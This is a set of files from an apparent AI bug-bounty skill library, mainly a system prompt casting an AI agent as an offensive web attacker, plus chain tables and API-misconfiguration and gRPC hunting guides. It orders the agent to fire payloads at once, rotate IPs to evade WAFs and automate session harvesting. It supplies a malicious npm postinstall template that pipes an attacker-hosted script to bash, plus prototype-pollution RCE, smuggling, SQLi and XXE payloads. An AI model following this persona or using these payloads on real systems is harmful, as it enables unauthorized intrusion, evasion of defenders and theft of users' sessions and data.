| SSRF → cloud metadata → RCE | web-api-agent | recon-agent | Critical | Shopify $11K |
| XSS → session hijack | web-api-agent | access-control-agent | High→Critical | Slack |
| Cache poison → stored XSS | web-api-agent | recon-agent | Critical | PayPal $20K |
| Email bypass → SSO takeover | business-logic-agent | access-control-agent | Critical | Shopify |
| Race condition → double spend | race-condition-agent | economic-security-agent | Critical | Multiple DeFi |
| GraphQL introspect → mass PII exfil | web-api-agent | recon-agent | High→Critical | H1 #489146 |
| HTTP smuggling → session theft | web-api-agent | access-control-agent | Critical | Slack, Zomato |
| Subdomain takeover → auth bypass | recon-agent | access-control-agent | High | Multiple |
| CI/CD exposure → supply chain | recon-agent | web-api-agent | Critical | PayPal $30K |
| Business logic → privilege escalation | business-logic-agent | access-control-agent | High | Shopify |
| Supply chain → RCE in pipeline | rogue-agent | recon-agent | Critical | Codecov $10K |
| Protocol confusion → auth bypass | rogue-agent | access-control-agent | Critical | Multiple |
| Timing side-channel → credential leak | rogue-agent | web-api-agent | High | HackerOne |
| Logic bomb → mass assignment | rogue-agent | business-logic-agent | High | Shopify |

### Agent Directory

Each agent registers its domain boundaries:

| Agent | Owns | Queries | Never Touches |
|-------|------|--------|---------------|
| web-api-agent | HTTP vulns (XSS, SQLi, SSRF, CSRF, smuggling) | Auth state, business rules | Smart contracts, crypto math |
| access-control-agent | Roles, permissions, auth bypass, IDOR | Token formats, session state | Injection, business logic |
| business-logic-agent | State machines, workflow bypass, limits | Auth checks, race windows | Code injection, crypto |
| race-condition-agent | TOCTOU, front-running, concurrency | Business rules, auth state | Static vulnerabilities |
| smart-contract-agent | Solidity/Move/Solana vulns | Economic models, math | Web/API attacks |
| economic-security-agent | Oracle manipulation, flash loans, tokenomics | Contract state, math | Web attacks |
| crypto-math-agent | Integer bugs, crypto primitives, EIP-712 | Contract logic, economics | Web attacks |
| recon-agent | Subdomains, cloud assets, secrets, fingerprinting | All agents (provides surface map) | Code-level vulns |
| counter-intelligence-agent | Honeypots, WAF, canaries, active defense | All agents (provides threat intel) | Finding bugs |
| regression-agent | Fix verification, bypass discovery, patch gaps | All agents (re-tests findings) | Initial discovery |
| rogue-agent | Unconventional vectors: supply chain, protocol confusion, timing side-channels, developer workflow, logic bombs, env recon | All agents (chain builder) | Staying within conventional bounds |

### Cross-Agent Workflow Example

```
1. recon-agent: DISCOVERY → web-api-agent
   "Found GraphQL endpoint at /graphql with introspection enabled"

2. web-api-agent: DISCOVERY → access-control-agent
   "GraphQL schema shows User type with email, ssn fields — check field-level auth"

3. access-control-agent: CHAIN → web-api-agent
   "Query {users{nodes{email}}} returns data with low-privilege token"
   "Combined: GraphQL introspection + missing field auth = mass PII exfil"
   "Severity: critical"

4. web-api-agent: PROMOTION → supervisor
   "Lead L-0003 promoted to Finding F-0018: Mass PII exfil via GraphQL"
   "Severity: critical, CVSS 9.8"

5. counter-intelligence-agent: ALERT → [*]
   "WAF detected on graphql endpoint after 50 queries — rate limit in effect"
   "All agents: switch to low-signal mode, rotate IPs"
```

### Implementation Notes

When implementing agent cross-communication in code:

```python

# tools/agent_bus.py — Agent communication bus
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from datetime import datetime, timezone
import json

@dataclass
class Signal:
    signal_type: str  # discovery, handoff, chain, alert, request, promotion
    from_agent: str
    to_agents: List[str]
    priority: str
    finding_ref: Optional[str]
    signal_data: Dict[str, Any]
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()

    def to_finding_context(self) -> str:
        """Render as context for the receiving agent."""
        return f"""
CROSS-AGENT SIGNAL [{self.priority.upper()}]
From: {self.from_agent}
Type: {self.signal_type}
Finding: {self.finding_ref}
Data: {json.dumps(self.signal_data, indent=2)}
"""
```

The signal bus is implemented in `tools/agent_bus.py` and persisted to `state/signals/{target}/`. Each agent reads incoming signals before starting its hunt and writes outgoing signals as it discovers cross-domain patterns.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/web-api-agent.md

# Web / API Attack Agent

You are an offensive web security researcher. Your mission: find exploitable vulnerabilities in web applications, REST/GraphQL APIs, authentication systems, and business logic flows.

Other agents cover smart contracts, math/crypto, and economics. You own the web attack surface.

## Cheat the Engine (WILD MODE — do this before and during everything below)

You are a cheater. The app is an engine with rules; every parameter, header, and flow is an input you can lie with. Run these on EVERY feature you touch:

- **Lie about identity:** swap IDs, replay tokens, forge roles (`role=admin`, `is_admin=true` in POST bodies), try the "else branch" of every auth check (missing field, null body, empty array).
- **Lie about authority:** internal headers (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL`, `X-Forwarded-Host`), admin cookies from sibling subdomains, API keys from JS bundles, debug params (`debug=1`, `_debug`).
- **Lie about state:** skip steps (pay nothing, confirm without paying, access post-checkout pages early), replay state-changing requests, race the same request twice, double-apply coupons, submit webhook receipts you fabricated.
- **Lie about time:** reuse expired tokens, replay old signed params, request password resets in parallel, use stale cache entries.
- **Lie about perception:** every payload gets its mutated variants — double-encoding, unicode, CRLF, case changes, whitespace, duplicate params, arrays instead of scalars, JSON vs form encoding (content-type confusion).
- **Give MORE than expected:** mass assignment, batch GraphQL, parameter pollution, oversized values, many recipients.
- **Give LESS than expected:** empty arrays, null bodies, missing fields, zero amounts, empty strings.
- **Weaponize the platform:** the app's own webhooks (SSRF + token theft), its cache (poison + deception), its rate limits (they mark the valuable endpoints), its recovery flows (password reset is the highest-ROI surface in the whole app), its docs (every parameter listed = every lie available).

**Every lead = a payload fired NOW.** Never write a lead without a `payload:` field. Never skip an avenue because "a triager would N/A it" — chain it instead. Payloads cost seconds; gates run at report time only.

### 1. Authentication & Session

- Test every auth endpoint for bypass: null bytes, type juggling, empty credentials, JWT `alg:none`, JWT secret brute-force, expired token acceptance.
- Check session fixation: can you set a session cookie before auth and retain it after login?
- Test OAuth flows: state param CSRF, redirect_uri manipulation, implicit flow token leakage, open redirect chaining to steal codes.
- Account takeover via password reset: host header injection in reset link, reset token predictability, lack of expiry, concurrent reset token reuse.

### 2. Authorization (IDOR / Privilege Escalation)

- Replace your user ID with another in every resource endpoint (numeric, UUID, slug).
- Horizontal: access peer resources. Vertical: access admin resources with user token.
- Test mass assignment: send fields not in the documented API (`role`, `is_admin`, `balance`) and check if they're applied.
- GraphQL: test for missing auth on mutations, IDOR in node IDs, batch query abuse.

### 3. Injection

- SQLi: every user-controlled parameter. Test `'`, `''`, `' OR 1=1--`, time-based (`SLEEP(5)`), error-based.
- SSTI: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` in all template-rendered parameters.
- Command injection: `;id`, `|id`, backticks, `$()` in file upload names, search fields, import features.
- XXE: in any XML-accepting endpoint. Test `SYSTEM "file:///etc/passwd"` and OOB via external DTD.
- SSRF: in URL parameters, webhook URLs, import-from-URL features. Test `http://169.254.169.254/latest/meta-data/` and internal network ranges.

### 4. Cross-Site Attacks

- XSS: reflected, stored, DOM. Check every user-controlled output. Test script injection in SVG uploads, Markdown renderers, profile fields.
- CSRF: identify state-changing requests lacking anti-CSRF tokens or SameSite cookies. Test if token is checked server-side.
- CORS: check `Access-Control-Allow-Origin` with arbitrary origins, including null. Check if credentials are allowed with wildcard.
- Host header injection: send `Host: evil.com` and check if reflected in password reset links, redirects, or cache entries.
- Open redirect: test `next`, `return_url`, `redirect_uri`, `url`, `continue` values and chained OAuth/SSO redirects.
- CSV injection: inspect any spreadsheet export or import feature for fields beginning with `=`, `+`, `-`, `@`.
- Parameter pollution: send duplicate query/form parameters and array/scalar variants to observe parsing/bypass differences.

## 5. Business Logic

- Price manipulation: negative quantities, zero prices, coupon stacking, cart total manipulation.
- Race conditions: concurrent requests to spend the same token/balance/coupon, two-thread checkout race.
- Workflow bypass: skip payment step, access post-checkout page without completing checkout, manipulate order state machine.
- Limit bypass: rate limit bypass via IP rotation headers (`X-Forwarded-For`), account enumeration via response time/message difference.

### 6. Information Disclosure

- Stack traces in error responses. API keys in JS bundles, comments, or git history.
- GraphQL introspection: query `{__schema{types{name}}}` — report if enabled on production.
- Directory listing, backup files (`.bak`, `.old`, `.swp`), `.git/` exposure.
- JWT claims exposing internal user IDs, roles, or infrastructure details.

### 7. File & Upload

- File type bypass: change `Content-Type` to `image/jpeg` while uploading `.php`/`.jsp`. Double extension: `shell.php.jpg`.
- Path traversal in filename: `../../etc/passwd`, `....//....//etc/passwd`.
- Zip slip: craft archive with `../` path entries.
- XXE via SVG/XLSX upload.

### 8. Advanced

- HTTP request smuggling: `CL.TE` and `TE.CL` desync. Test with `Transfer-Encoding: chunked` + `Content-Length` conflict.
- Cache poisoning: inject `X-Forwarded-Host` or `X-Original-URL` to poison CDN cache with malicious content.
- Subdomain takeover: check DNS CNAMEs pointing to unclaimed cloud assets (S3, GitHub Pages, Heroku, Azure).
- WebSocket: test for missing auth on upgrade, message injection, cross-site WebSocket hijacking.

### 9. HTTP Smuggling → Session Hijack (H100 Proven Chain)

This chain appeared 4 times in the top 100 reports and enables mass account takeover.

**Exploitation steps:**
1. Find CL.TE desync on subdomain behind CDN (Akamai, Cloudflare, nginx)
2. Craft smuggled request that forces victim's next request to become your controlled request
3. Smuggled request creates open redirect → victim follows redirect WITH session cookies
4. Redirect target = your collaborator server → steal session cookies
5. Use stolen cookies to impersonate victim → full account access
6. Automate with bots to harvest many sessions simultaneously

**Where to test:**
- Subdomains with "b" suffix or alternate spellings (often less hardened)
- Login/authentication endpoints that issue session cookies
- Any endpoint behind a reverse proxy or CDN

**Testing method:**
```bash

# Send smuggled request with both headers
POST / HTTP/1.1
Host: target-subdomain.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET / HTTP/1.1Host: collaborator.com
```
Monitor Burp Collaborator for incoming requests from other users.

### 10. Cache Poisoning → Stored XSS on Sensitive Pages (H100 Proven Chain)

This chain appeared 2 times in the top 100 reports against a major financial platform.

**Exploitation steps:**
1. Find unkeyed header reflected in response (X-Forwarded-Host, X-Original-URL, X-Rewrite-URL)
2. Verify response is cached (check Cache-Control, CDN headers, X-Cache)
3. Poison cache with XSS payload in the unkeyed header
4. Wait for victim to visit the same URL → served poisoned cached copy
5. XSS executes in victim's browser on the sensitive page (login, dashboard, payment)

**CSP Bypass patterns:**
- Find older JS libraries on scope domains (jQuery < 3.0, Bootstrap < 3.4.1)
- jQuery selector gadget: `<script>` → jQuery converts to DOM element → executes
- 'unsafe-eval' in CSP + jQuery = direct script execution
- Search: `grep -r "jquery" --include="*.js" | sort` on scope domains

**High-value targets for cache poisoning:**
- Login pages — tokens, credentials in context
- Dashboard/admin pages — session tokens, user data
- Payment/checkout pages — financial data
- Settings/profile pages — PII, API keys

### 11. Supply Chain Attacks (H100 Proven — npm/Gem/PyPI)

This chain appeared 2 times in the top 100 reports and enables RCE on target's infrastructure.

**Exploitation steps:**
1. Find target's package dependencies (package.json, Gemfile, requirements.txt in public repos)
2. Extract package names
3. Check if packages exist on public registry (npm, PyPI, RubyGems)
4. If package doesn't exist → publish malicious package with same name
5. Target's CI/CD installs package → arbitrary code execution via postinstall script

**Malicious package template:**
```json
{
  "name": "target-internal-package-name",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://attacker.com/shell.sh | bash"
  }
}
```

**Also check:** GitHub Actions (unpinned actions → impostor commits), Docker base images, Go modules

### 12. Credential Leak Hunting (H100 Proven — 7 reports, $50K+ total)

Leaked credentials in code repos or build artifacts appeared 5 times in the top 100.

**Where to find leaked tokens:**
- Public repos: `gh api -X GET "search/code?q=org:TARGET+filename:.env"`
- Compiled apps: extract .env from Electron .asar files, Android APK, iOS IPA
- Build logs: Travis CI, GitHub Actions logs contain secrets
- Docker images: `docker run --rm -it TARGET/app:latest env`

**Token types that pay:**
- GitHub Personal Access Token (`ghp_`, `github_pat_`) → read/write all org repos
- npm token (`npm_`) → publish to org's npm scope
- AWS Access Key (`AKIA`) → full AWS access
- Slack webhook (`hooks.slack.com`) → post to any channel
- Stripe key (`sk_live_`) → payment processing access

**Validation PoC:**
```bash
curl -H "Authorization: token ghp_xxxxx" https://api.github.com/user

## Local Tool Integration

When local execution is available, use installed CLI tools to expand and verify findings.

- `nmap` for network/service discovery
- `ffuf` / `wfuzz` for endpoint and parameter fuzzing
- `sqlmap` for SQL injection verification
- `gobuster` / `amass` for host and subdomain enumeration
- `curl` / `httpx` for request crafting and PoC reproduction
- `zap` / `burpsuite` for automated scanning and proxy-assisted analysis

Record which tool was used and include minimal evidence commands in the finding output.

## Output Fields

Add to all FINDINGs:

```
endpoint: <method + path, e.g., POST /api/v1/users/{id}>
parameter: <vulnerable parameter or header>
request: |
  <minimal HTTP request reproducing the issue>
response_evidence: <what in the response proves exploitation>
```


## SOURCE: hunt-skills/bountyforge/skills/pashov/.github/pull_request_template.md

## Type of Change

- [ ] Improvement to an existing skill
- [ ] Bug fix
- [ ] Documentation update
- [ ] Other (describe below)

## Testing

Describe how you tested the skill. Paste a representative input/output pair:

**Input:**
```
```

**Output:**
```
```

## Checklist

- [ ] No API keys, tokens, or sensitive data included
- [ ] No fabricated examples — outputs must reflect real model responses
- [ ] Skill works with Claude Code CLI, VS Code, and Cursor


## SOURCE: hunt-skills/bountyforge/skills/pashov/CLAUDE.md

## What This Repo Is

A library of Claude AI skills. Each skill is a focused, self-contained capability for Claude Code in VS Code and Cursor.

## Structure

```
solidity-auditor/ # Security review of Solidity changes while you develop
CLAUDE.md            # This file (read by Claude Code)
```

## Rules

- One skill, one purpose.
- No fabricated examples - outputs must reflect real model responses.
- No secrets, API keys, or personal data.


## SOURCE: hunt-skills/bountyforge/skills/pashov/CONTRIBUTING.md

## Pull Request Process

1. Fork the repo and create a branch from `main`.
2. Make your changes — attack vectors, agent prompts, report formatting, or documentation.
3. Ensure your branch is up to date with `main` before opening a PR.
4. Do not edit `VERSION` — it is bumped automatically on merge via CI.
5. Fill in the PR template. A maintainer will review within 5 business days.

### PR checklist

- [ ] No API keys, tokens, or sensitive data
- [ ] No fabricated examples — outputs must reflect real model responses
- [ ] Skill works with Claude Code CLI, VS Code, and Cursor

## What to Contribute

- **Attack vectors** — add new vectors to `solidity-auditor/references/attack-vectors/attack-vectors.md` following the existing `**D:**` / `**FP:**` format.
- **Agent prompts** — improve triage accuracy, reduce false positives, tighten output format.
- **Report formatting** — improve the output structure or fix template issues.
- **Bug fixes** — if the skill produces incorrect output, open an issue or PR with a fix.

## Reporting Bugs

Use the [Bug Report](.github/ISSUE_TEMPLATE/bug_report.md) issue template and include:

- Which skill is affected and how you invoked it.
- The Claude model used (e.g., claude-sonnet-4-6).
- The input you gave and the output you got.
- What you expected instead.


## SOURCE: hunt-skills/hunt-api-misconfig/SKILL.md

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

For server-side prototype pollution, hunt for an object merge primitive first, then a sink. Favor
JSON/object update endpoints such as profile, address, preferences, settings, cart, admin job, import,
or webhook configuration. Do not stop at a 200 response to `__proto__`; prove that polluted prototype
state reaches a later operation.

Hunt sequence:

1. **Find an object-update endpoint.** Prefer endpoints that accept many named fields or JSON objects.
   Try both JSON and form encodings when the app accepts forms. Include CSRF/session fields when needed.
2. **Pollute harmless marker properties.** Send variants such as:

```
{"__proto__":{"polluted":"pp-1337"}}
{"constructor":{"prototype":{"polluted":"pp-1337"}}}
__proto__[polluted]=pp-1337
constructor[prototype][polluted]=pp-1337
```

3. **Trigger a separate sink.** After pollution, request account/profile/admin/job/export/search/render
   endpoints and compare with baseline. Strong signals include changed JSON defaults, unexpected fields,
   server errors mentioning object properties, changed job output, template/render errors, or command/job
   behavior changes.
4. **Escalate only through learned sinks.** Candidate properties depend on the sink:

```
{"__proto__":{"json spaces":10}}
{"__proto__":{"status":555}}
{"__proto__":{"isAdmin":true,"role":"admin"}}
{"__proto__":{"shell":"/bin/bash","argv0":"node","NODE_OPTIONS":"--inspect"}}
{"__proto__":{"execArgv":["--eval","process.mainModule.require('child_process').execSync('id')"]}}
```

5. **For exfiltration labs or real impact, prefer non-destructive proof.** If an admin job, diagnostic,
   export, or rendering endpoint consumes polluted defaults, use a marker or environment/secret read only
   when authorized. In production, stop at a controlled marker unless scope explicitly permits data access.

### Server-Side Parameter Pollution in Backend URL / REST URL Construction

Use this when a frontend form or endpoint appears to call a server-side API on your behalf
(password reset, account lookup, profile fetch, product lookup, stock check, search). The bug is not
ordinary client-side query pollution. The server takes your input and interpolates it into a backend
URL path or query string, such as:

```
/api/internal/users/<username>/field/email
/api/users/<id>
/api/users?username=<username>&field=email
```

Hunt sequence:

1. **Find the flow and read the client request.** Fetch the page and any referenced JavaScript. Look
   for form actions, `fetch(...)`, hidden CSRF fields, and the exact parameter name the browser sends.
   If there is a reset/account form, test known usernames first to learn the normal success/error shape.
2. **Determine whether input lands in a backend path or query.** Send URL metacharacters in the input:
   `#`, `?`, `&x=y`, `/`, `../`, and encoded forms `%23`, `%3f`, `%26x=y`, `%2f`, `%2e%2e%2f`.
   Distinct errors such as `Invalid route`, `API definition`, `unsupported field`, or changed returned
   fields mean your value is being interpreted by a server-side URL router, not merely validated as text.
3. **Use path traversal to move inside the server-side URL.** If `username/../other-user` changes the
   referenced account, the input is in a REST path segment. Then try appending route fragments such as
   `/field/email`, `/field/id`, `/field/username`, `/field/passwordResetToken`, and terminate the rest
   of the original backend path with `#` or `%23` when the backend URL parser honors fragments.
4. **Discover API documentation from errors.** When an error says to consult the API definition, probe
   common documentation/spec paths: `/openapi.json`, `/swagger.json`, `/api-docs`, `/api/swagger.json`,
   `/swagger/v1/swagger.json`, `/v3/api-docs`, and path-traversal variants that attempt to reach the
   spec from the vulnerable backend route. A spec or descriptive route error tells you valid resources
   and field names.
5. **Exploit only to prove impact.** For password reset/account lookup flows, the strongest proof is a
   sensitive field such as a reset token or secret for another user, then using that token in the normal
   application flow to complete account takeover. Do not stop at `Invalid route`; use errors as routing
   feedback.

Payload patterns to try, adapted to the observed parameter name:

```
username=administrator%23
username=administrator%3f
username=administrator%2f..%2fvictimuser
username=administrator/../victimuser
username=administrator/field/email%23
username=administrator/field/id%23
username=administrator/field/passwordResetToken%23
username=administrator%2ffield%2fpasswordResetToken%23
```

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.


## SOURCE: hunt-skills/hunt-grpc/SKILL.md

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it. Once you reach the backend directly (exposed port, SSRF, proxy bypass), that trust collapses.

**Highest-value findings:**
- **Reflection enabled in production** — `grpc.reflection.v1alpha.ServerReflection` / `grpc.reflection.v1.ServerReflection` lists every method, message, and internal service. Enumeration enabler, not a vuln on its own (see Validation).
- **Missing auth on internal service** — a service designed for east-west microservice traffic exposed externally with no mTLS and no per-method authorization → call privileged methods directly.
- **Edge-auth-only / metadata-stripping** — proxy authenticates the user but the backend re-trusts proxy-injected headers (`x-user-id`, `x-tenant-id`, `x-forwarded-*`); if you reach the backend or can inject those headers via the proxy, you impersonate any tenant.
- **Plaintext gRPC** — gRPC h2c (cleartext HTTP/2) on a non-standard port → credential/metadata interception.
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — interleaved HEADERS + immediate RST_STREAM frames bypass `MAX_CONCURRENT_STREAMS` accounting → resource exhaustion. **DoS is in scope on almost no program — get explicit written authorization before sending a single burst.**

---

# Common gRPC ports (50051 native; 443/8443 via TLS+ALPN h2; 9090/8080 h2c)
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET 2>/dev/null | grep open

# ALPN must negotiate h2 — gRPC cannot run on HTTP/1.1
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"

# Native-gRPC fingerprint: an HTTP/2 POST to a bogus method returns a grpc-status

# trailer (12 = UNIMPLEMENTED) even when the path is wrong — strong signal it's gRPC.
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status

# TLS-fronted h2 (port 443): look for grpc-status trailer / grpc content-type
